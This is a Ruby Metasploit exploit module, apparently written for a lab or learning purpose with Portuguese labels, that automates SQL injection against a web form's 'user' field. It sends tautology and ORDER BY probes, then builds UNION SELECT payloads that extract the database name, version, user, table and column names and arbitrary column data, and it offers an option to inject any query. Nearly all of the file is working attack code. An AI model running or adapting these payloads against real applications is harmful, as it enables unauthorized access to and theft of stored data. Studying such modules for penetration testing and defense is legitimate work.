
require 'msf/core'

class Metasploit4 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info={})
    super(update_info(info,
      'Name'           => 'SQL injection', 
      'Description'    => %q{
        Este módulo explora automaticamente vulnerabilidades de SQL injection em aplicações web.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Bruno Ramos'
        ],
      'References'     =>
        [
          ['URL', 'https://github.com/rapid7/metasploit-framework/wiki'], 
        ],
      'Privileged'     => false,
      'Payload'        =>
        {
          'Space'    => 10000,
          'DisableNops' => true,
          'Compat'      =>
            {
              'PayloadType' => 'cmd'
            }
        },
      'Platform'       => 'unix',
      'Arch'           => ARCH_CMD,
      'Targets'        =>
        [
          ['Vulnerable App', { } ],
        ],
      'DisclosureDate' => '6 julho 2016', 
      'DefaultTarget'  => 0))

    register_options(
      [
	OptString.new('TABELA',[false, "Selecione a tabela", ""]),
	OptString.new('QUERY',[false, "Introduza a query", ""]),
	OptString.new('COLUNAS',[false, "Selecione a coluna/as", ""]),
    OptString.new('TARGETURI',[true, "Caminho da pagina vulneravel", "/sqli/index.php"]),
	OptString.new('OPTION', [ false, 'Selecione a opção', "0" ]),
      ],self.class)
  end

  def check
    	res = command_exec("'")
	c= "You have an error in your SQL syntax"
	a = res.body
	b = a[0,36]
	if b == c
	return Exploit::CheckCode::Vulnerable
	else 
	return Exploit::CheckCode::Safe
	end
  end

  
 def command_exec(shell)
    res = send_request_cgi({
      'method'   => 'POST',
      'uri'      => normalize_uri(target_uri.path),
      'vars_post' => {
        'user' => shell,
	'submit' => 'submit'
      }
    })
  end
	
	
  def exploit
	opcao = datastore['OPTION']
	tabela = datastore['TABELA']
	colunas = datastore['COLUNAS']
	
	i = 0	
	num =0
	coluna = 1
	resultados = Array.new()
	
	res = command_exec("1' or 1=1#")
	html = res.get_html_document
 	htmlR = html.search('div[@id="test"]')
	resultado = htmlR.text
	resultados.insert(i,"#{resultado}")
	i +=1

begin
		res = command_exec("1'order by #{coluna}#")
		html = res.body[0,14]
		erro = "Unknown column"
		coluna +=1
	end while erro != html	
	coluna -= 2
	resultados.insert(i,"A tabela tem #{coluna} colunas")
	i +=1

	aux = 1
	query = "'union all select " 
	begin
		if aux==coluna
			query << "#{aux}#"
		else
			query << "#{aux},"
		end	
		aux +=1
	end while aux <= coluna
	res = command_exec("#{query}")
	html = res.get_html_document
 	htmlR = html.search('div[@id="test"]')
	resultado= htmlR.text.lines.first
	resultados.insert(i,"A coluna afetada e a #{resultado}")
	i +=1
	
        col = resultado
	col = col.to_i
	query = "'union select "
	aux = 1
		if coluna == col
		
			begin 
				if aux == coluna
	
					query << "database()#"
				else

					query << "#{aux},"
				end	
				aux +=1

			end while aux <= coluna
		else

			begin 


				if aux == col

					query << "database(),"
					aux +=1	
				end
				if aux == coluna

					query << "#{aux}#"
				else

					query << "#{aux},"
				end	
				aux +=1

			end while aux <= coluna

		end

	#end
	res = command_exec("#{query}")
	html = res.get_html_document
 	htmlR = html.search('div[@id="test"]')
	resultado= htmlR.text
	resultados.insert(i,"Nome da base de dados: #{resultado.lines.first}")
	i +=1
	
	
	aux=1
	query = "'union select "
		if coluna==col	
			begin 
				if aux==coluna
					query << "version()#"
				else
					query << "#{aux},"
				end	
				aux +=1
			end while aux <= coluna
		else
			begin 
				if col == aux
					query << "version(),"
					aux +=1	
				end
				if aux==coluna
					query << "#{aux}#"
				else
					query << "#{aux},"
				end	
				aux +=1
			end while aux <= coluna
		end
	#end
	res = command_exec("#{query}")
	html = res.get_html_document
 	htmlR = html.search('div[@id="test"]')
	resultado= htmlR.text
	resultados.insert(i,"Versao da base de dados: #{resultado.lines.first}")
	i +=1

	aux=1
	query = "'union select "
		if coluna==col	
			begin 
				if aux==coluna
					query << "user()#"
				else
					query << "#{aux},"
				end	
				aux +=1
			end while aux <= coluna
		else
			begin 
				if col == aux
					query << "user(),"
					aux +=1	
				end
				if aux==coluna
					query << "#{aux}#"
				else
					query << "#{aux},"
				end	
				aux +=1
			end while aux <= coluna
		end
	res = command_exec("#{query}")
	html = res.get_html_document
 	htmlR = html.search('div[@id="test"]')
	resultado= htmlR.text
	resultados.insert(i,"User da base de dados: #{resultado.lines.first}")
	i +=1
	
	
	
	aux=1
	query = "'union select "
		if coluna == col	
			begin 
				if aux == coluna
					query << "group_concat(table_name) from information_schema.tables where table_schema = database()#"
				else
					query << "#{aux},"
				end	
				aux +=1
			end while aux <= coluna
		else
			begin 
				if col == aux
					query << "group_concat(table_name),"
					aux +=1	
				end
				if aux == coluna
					query << "#{aux} "
				else
					query << "#{aux},"
				end	
				aux +=1
			end while aux <= coluna
			query << "from information_schema.tables where table_schema = database()#" 
		end

	res = command_exec("#{query}")
	html = res.get_html_document
 	htmlR = html.search('div[@id="test"]')
	resultado= htmlR.text
	resultados.insert(i,"Nome das tabelas: #{resultado.lines.first}")
	i +=1
	
case opcao
when "0"
	z = i
	i =0
	begin
	puts resultados[i]
	i += 1
	end while i<=z 
when "1"
			
	
			aux=1
			query = "'union select "
			if coluna == col	
			begin 
				if aux == coluna
					query << "group_concat(column_name) from information_schema.columns where table_name = '#{tabela}'#"
				else
					query << "#{aux},"
				end	
				aux +=1
			end while aux <= coluna
			else
			begin 
				if col == aux

					query << "group_concat(column_name),"
					aux +=1	
				end
				if aux == coluna
					query << "#{aux} "
				else
					query << "#{aux},"
				end	
				aux +=1
			end while aux <= coluna
			query << "from information_schema.columns where table_name = '#{tabela}'#"
			end

res = command_exec("#{query}")
	html = res.get_html_document
 	htmlR = html.search('div[@id="test"]')
	resultado= htmlR.text
	puts "#{resultado.lines.first}"

when "2"

aux=1
			query = "'union select "
			if coluna == col	
			begin 
				if aux == coluna
					query << "group_concat(#{colunas}) from #{tabela}#"
				else
					query << "#{aux},"
				end	
				aux +=1
			end while aux <= coluna
			else
			begin 
				if col == aux

					query << "group_concat(#{colunas}),"
					aux +=1	
				end
				if aux == coluna
					query << "#{aux} "
				else
					query << "#{aux},"
				end	
				aux +=1
			end while aux <= coluna
			query << "from #{tabela}#"
			end


res = command_exec("#{query}")
	html = res.get_html_document
 	htmlR = html.search('div[@id="test"]')
	resultado= htmlR.text
	puts "#{resultado.lines.first}"

when "3"

	query = "'"
	query << datastore['QUERY']
        res = command_exec("#{query}")
	html = res.get_html_document
 	htmlR = html.search('div[@id="test"]')
	resultado= htmlR.text
	puts "#{resultado.lines.first}"
	puts "#{query}"
	else 
	puts "Introduza um valor correto"
	end

end
end
